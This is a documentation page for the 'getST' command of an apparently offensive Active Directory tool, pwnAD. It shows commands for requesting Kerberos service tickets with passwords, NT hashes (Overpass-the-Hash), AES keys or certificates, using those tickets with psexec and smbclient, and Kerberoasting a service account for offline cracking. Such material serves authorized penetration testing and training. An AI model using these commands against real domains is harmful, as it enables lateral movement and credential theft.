# getST

Obtain a Kerberos Service Ticket (ST).

## Usage

```bash
pwnAD [auth options] getST -spn <service/host>
```

## Description

The `getST` action performs a Kerberos TGS-REQ to obtain a Service Ticket for a specified service. This can be done with fresh credentials or using an existing TGT from a ccache file.

## Parameters

| Parameter | Description |
|-----------|-------------|
| `-spn` | Service Principal Name (e.g., `cifs/dc01.domain.local`) |

## Authentication Methods

| Method | Flags | Description |
|--------|-------|-------------|
| Password | `-p` | Gets TGT first, then ST |
| NT Hash | `-H` | Gets TGT first (Overpass-the-Hash) |
| AES Key | `--aes-key` | Gets TGT first (Pass-the-Key) |
| ccache | `-k` | Uses existing TGT from KRB5CCNAME |
| Certificate | `-pfx` or `-cert -key` | Gets TGT via PKINIT, then ST |

## Examples

### Using Password

```bash
pwnAD --dc-ip 192.168.1.10 -d domain.local -u administrator -p 'Pass!' getST -spn cifs/dc01.domain.local
[*] Getting ST for user
[*] Saving ticket in administrator@cifs_dc01.domain.local@DOMAIN.LOCAL.ccache
```

### Using Existing TGT

```bash
# First, ensure you have a TGT
export KRB5CCNAME=administrator.ccache

# Request Service Ticket
pwnAD --dc-ip 192.168.1.10 -d domain.local -u administrator -k getST -spn cifs/dc01.domain.local
[*] Getting ST for user
[*] Saving ticket in administrator@cifs_dc01.domain.local@DOMAIN.LOCAL.ccache
```

### Using Certificate (PKINIT)

```bash
pwnAD --dc-ip 192.168.1.10 -d domain.local -u administrator -pfx admin.pfx getST -spn cifs/dc01.domain.local
[*] Getting ST for user
[*] Saving ticket in administrator@cifs_dc01.domain.local@DOMAIN.LOCAL.ccache
```

## Common SPNs

| Service | SPN Format | Use Case |
|---------|------------|----------|
| SMB/CIFS | `cifs/<hostname>` | File shares, psexec |
| HTTP | `http/<hostname>` | Web services |
| LDAP | `ldap/<hostname>` | LDAP operations |
| HOST | `host/<hostname>` | General computer access |
| MSSQL | `MSSQLSvc/<hostname>:1433` | SQL Server |
| Exchange | `exchangeMDB/<hostname>` | Exchange services |

## Using the Service Ticket

```bash
export KRB5CCNAME=administrator@cifs_dc01.domain.local@DOMAIN.LOCAL.ccache

# Use with Impacket
smbclient.py -k -no-pass domain.local/administrator@dc01.domain.local
psexec.py -k -no-pass domain.local/administrator@dc01.domain.local
```

## Interactive Mode

```bash
pwnAD -i --dc-ip 192.168.1.10 -d domain.local -u administrator -p 'Pass!'

pwnAD [domain.local\administrator]> getST -spn cifs/dc01.domain.local
[*] Getting ST for user
[*] Saving ticket in administrator@cifs_dc01.domain.local@DOMAIN.LOCAL.ccache

# Use immediately
pwnAD [domain.local\administrator]> !export KRB5CCNAME=administrator@cifs_dc01.domain.local@DOMAIN.LOCAL.ccache
pwnAD [domain.local\administrator]> !smbclient.py -k -no-pass domain.local/administrator@dc01
```

## Output

The Service Ticket is saved as `<user>@<spn>@<REALM>.ccache` in the current directory.

## Technical Details

### TGS-REQ/TGS-REP

1. Client sends TGS-REQ with:
    - TGT (in PA-TGS-REQ)
    - Requested service (sname)
    - Authenticator (encrypted with TGT session key)
2. KDC responds with TGS-REP containing:
    - Service Ticket (encrypted with service key)
    - Session key (encrypted with TGT session key)

## Use Cases

### Access Remote Services

```bash
# Get ticket for file share
pwnAD [auth] getST -spn cifs/fileserver.domain.local

# Get ticket for web service
pwnAD [auth] getST -spn http/webapp.domain.local

# Get ticket for SQL Server
pwnAD [auth] getST -spn MSSQLSvc/sqlserver.domain.local:1433
```

### Kerberoasting

While pwnAD has `get kerberoastables` for enumeration, you can manually request tickets:

```bash
# Request ticket for service account
pwnAD --dc-ip 192.168.1.10 -d domain.local -u lowpriv -p 'Pass!' getST -spn http/webapp.domain.local

# The ticket can be extracted and cracked offline
```

## Troubleshooting

### "KDC_ERR_S_PRINCIPAL_UNKNOWN"

Service not found. Check:

- SPN spelling and format
- Service exists (use `get spn` to enumerate)

### "KDC_ERR_TGT_REVOKED"

TGT has been revoked (password changed). Get a new TGT.

### "KRB_AP_ERR_MODIFIED"

PAC validation failed. This can indicate:

- Ticket tampering
- Clock skew issues
- Service account password change
